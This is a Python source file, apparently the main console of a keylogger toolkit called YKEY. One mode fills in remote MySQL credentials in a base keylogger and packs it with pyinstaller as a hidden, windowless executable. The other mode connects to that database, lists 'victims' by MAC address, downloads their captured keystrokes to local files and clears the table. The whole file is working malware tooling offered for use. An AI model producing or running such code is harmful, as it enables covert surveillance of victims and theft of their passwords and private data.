# !/usr/bin/python

from libs.colors import COLORS
from os.path import dirname, realpath
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect
from libs.logo import PrintLogo
from sys import argv


devnull = open(devnull, 'w')
colors = COLORS()
program_path = dirname(realpath(__file__))
activated_option = [colors.ULINE + colors.BOLD + 'ykey' + colors.RESET]
logo_printer = PrintLogo(program_path)


# definitions fo global program

def execfile_y(file_name, globals_variables):
    exec(compile(open(file_name, "rb").read(), file_name, 'exec'), globals_variables)


def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials


#definitions for generating keylogger executable

def print_generation_options(inputs_dict):

    descriptions = {
        'PNAME':'This is the name of the final executable',
        'PID': 'This is the program ID of the virus',
        'SLEEP': 'Number of seconds it sleeps during work',
        'UNAME': 'This is the User name of SQL database',
        'PASSWD': 'This is the Password of SQL database',
        'DATABASE': 'This is the Database name of SQL database',
        'SERVER' : 'This is the Host name of SQL database',
        'PORT': 'This is the Port of SQL database'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
        table_data.append(single_data)

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def generate_keylogger(inputs_dict):
    global program_path
    print(colors.Yellow + '[!]Checking the configuration of source folders')
    try:
        global devnull
        check_output('mkdir sources', shell=True, stderr=devnull)
        print(colors.Yellow + '[!]Sources folder did not found' + colors.RESET)
        print(colors.Green + '[+]Sources folder created' + colors.RESET)
    except CalledProcessError:
        print(colors.Green + '[+]Sources Folder found already created' + colors.RESET)

    # activating virtual environment
    print(colors.Yellow + '[!]Trying to access the virtual environment for the program' + colors.RESET)

    try:
        venv_file_path = program_path + '/venv/bin/activate_this.py'
        execfile_y(venv_file_path, dict(__file__=venv_file_path))
        print(colors.Green + '[+]Virtual Environment Activated!!')


        with open(program_path + '/libs/main_key_logger.py' , 'r') as logger_base_source:
            content = logger_base_source.read()
        print(colors.Green + '[+]Base File read successful')

        content = content.replace("'**p_id**'", inputs_dict['PID'])
        content = content.replace("'**sleep**'", inputs_dict['SLEEP'])
        content = content.replace('**Uname**', inputs_dict['UNAME'])
        content = content.replace('**dbname**', inputs_dict['DATABASE'])
        content = content.replace('**psswd**', inputs_dict['PASSWD'])
        content = content.replace('**server**', inputs_dict['SERVER'])
        content = content.replace("'**port**'", inputs_dict['PORT'])    

        with open(program_path + '/sources/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
            output_logger.write(content)
        print(colors.Green + '[+]Source File writing successful')

        with open(program_path + '/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
            output_logger.write(content)
        print(colors.Green + '[+]Source File coppied to working directory')

        print(colors.Yellow + '[!]Creating Executables.. this may take some time....')
        check_output('pyinstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
        print(colors.Green + '[+]Executables created success fully')
        print(colors.Green + '[+]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))

        print(colors.Yellow + '[!]Removing temp files......')
        name = program_path + '/' + inputs_dict['PNAME']
        check_output("rm '{}'.py".format(name), shell=True)
        check_output("rm '{}'.spec".format(name), shell=True)
        check_output("rm -R '{}/'build".format(program_path), shell=True)
        check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
        print(colors.Green + '[+]Generation successful\n\n' + colors.RESET)

    except Exception as error:
        print(colors.Red + '[-]Erroro occured while activating the virtual environment')
        print(colors.Red + '[-]Error --> ' + error)
        print(colors.Yellow + 'Please re install the YKEY program to get rid of this error')
        exit(0)


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def activate_generation(program_path):
    database_credentials = read_credential_file(program_path)

    saved_inputs_dict = {
        'PNAME':'YKEY_Keylogger',
        'PID': '1',
        'SLEEP': '900',
        'UNAME': database_credentials['Username'],
        'PASSWD': database_credentials['Password'],
        'DATABASE': database_credentials['Database'],
        'SERVER' : database_credentials['Server'],
        'PORT': database_credentials['Port']
    }

    # from here it will do the command and request thing
    global activated_option
    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        # if the command is show options then show options
        if command == 'show options' or command == 'options':
            print_generation_options(saved_inputs_dict)
        
        # if the command is generate then generate the key logger
        elif command == 'generate':
            generate_keylogger(saved_inputs_dict)

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            setting = command.split()[1]
            new_value = command.split()[2]
            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
        
        # if clear clear the screen
        elif command == 'clear':
            call('clear', shell=True)

        # if the command is help print help
        elif command == 'help':
            logo_printer.print_help()

        # if the command id exit then break the loop
        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}generate({}KeyLogger{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        # if the command is non of above it is a unreconised command
        else:
            print(colors.Red + '[-]Invalid command' + colors.RESET)


#definitions for litener program

def show_victim_data():
    global program_path

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
            host     = credentials['Server'],
            user     = credentials['Username'],
            passwd   = credentials['Password'],
            database = credentials['Database'],
            port     = credentials['Port']
        )

        my_cursor = sql_database.cursor()
        command = 'SELECT * FROM `key_logs`'
        my_cursor.execute(command)
        
        data = list(map(list,my_cursor.fetchall()))

        # proccess data here
        for row in data:
            if row[2] == '':
                row[2] = colors.Red + 'NO LOGS' + colors.RESET
            else:
                row[2] = colors.Green + 'LOGS EXISTS' + colors.RESET


        header = [[colors.BOLD + 'P_ID', colors.BOLD + 'MAC address', colors.BOLD + 'Key Logs' + colors.RESET]]

        table = AsciiTable(header + data)
        print(table.table)

        print(colors.RESET, end='\n\n')
        


    except Exception as error:
        print(colors.Red + '[-]Error occured during the proccess')
        print('[-]{}'.format(error) + colors.RESET)


def read_online_keys():
    try:
        global program_path
        credentials = read_credential_file(program_path)

        try:

            hacker_database = connect(
                host     = credentials['Server'],
                user     = credentials['Username'],
                passwd   = credentials['Password'],
                database = credentials['Database'],
                port     = credentials['Port']
            )

            # reading the data base
            my_cursor = hacker_database.cursor()
            command = "SELECT * FROM `key_logs`"
            my_cursor.execute(command)
            data = my_cursor.fetchall()

            report = extract_write_data(data)
            heading = ['P_ID', 'MAC_ADDR', 'LOG stat', 'Process stat']

            draw_table(heading, report)

            # clear the data base
            command = "UPDATE `key_logs` SET `keys` = ''"
            my_cursor.execute(command)

            print(colors.Green + '\n[+]Database cleared\n' + colors.RESET)

            hacker_database.commit()

        except Exception as e:
            print(colors.Red + '[-]Error occurred while connecting to the database')
            print(colors.Red + '[-]' + e + colors.RESET)
            exit(0)

    except:
        print(colors.Red + '[-]Error reading credentials' + colors.RESET)
        exit(0)


def extract_write_data(data_list):
    try:
        call('mkdir keylogs', shell=True)
    except:
        pass

    print('\n' + colors.Cyan + '[+]Directory keylogs created')
    print(colors.Cyan + '[+]Processing data' + colors.RESET, end='')

    # crete a empty list to append process report
    extract_report = []

    for row in data_list:

        p_id = row[0]
        mac_address = row[1]
        one_row_report = [p_id, mac_address]

        try:
            log = row[2]
            if len(log) > 0:
                one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
                with open(f'keylogs/p_id_{p_id}.txt', 'a') as log_file:
                    log_file.write('\n\n\n\n\n')
                    log_file.write(log)

            else:
                one_row_report.append(colors.Red + 'NO LOG' + colors.RESET)

            one_row_report.append('Completed')

        except:
            while len(one_row_report) < 3:
                one_row_report.append('')
            one_row_report.append('Error')

        extract_report.append(one_row_report)

    return extract_report


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def activate_listener():
    # from the begining used command line interface
    global activated_option

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'show victims':
            show_victim_data()

        elif command == 'clear':
            call('clear', shell=True)

        elif command == 'extract':
            read_online_keys()

        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}listen({}KeyLogger{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == 'help':
            logo_printer.print_help()

        else:
            print(colors.Red + '[-]Invalid comand' + colors.RESET)


# defifnition for main program

def print_main_options():
    options = {
        'generation': 'Use this option to generate keyloggers',
        'listener': 'Use this options to read logged keys of all victims'
    }

    table_data = [[colors.BOLD + 'Option', colors.BOLD + 'Description' + colors.RESET]]
    for option in options:
        row_data = [option, options[option]]
        table_data.append(row_data)

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


# the main program

def main():
    global program_path
    global activated_option
    # firstly clear the screen
    call('clear', shell=True)
    logo_printer.print()

    # then enter the infinite command input section
    while True:
        # Input the command
        command = input("".join(activated_option) + ' > ')

        # if the command is use generation
        if command == 'use generation':
            activated_option.append(' {}generate({}KeyLogger{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            activate_generation(program_path)

        # if the command is to activate the listenet
        elif command == 'use listener':
            activated_option.append(' {}listen({}KeyLogger{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            activate_listener()

        # if the command is options or show options
        elif command == 'options' or command == 'show options':
            print_main_options()

        # if the ommcand is clear clrat the screen
        elif command == 'clear':
            call('clear', shell=True)

        # if the command is exit or quit breake the progrm
        elif command == 'quit' or command == 'exit':
            break

        elif command == 'help':
            logo_printer.print_help()

        else:
            print(command)
            print(colors.Red + '[-]Invalid command' + colors.RESET)

if __name__ == '__main__':

    try:
        if argv[1] == '--help':
            logo_printer.print_help()
        else:
            print(colors.Red + '[-]Invalid argument')

    except IndexError:
        main()
        exit(0)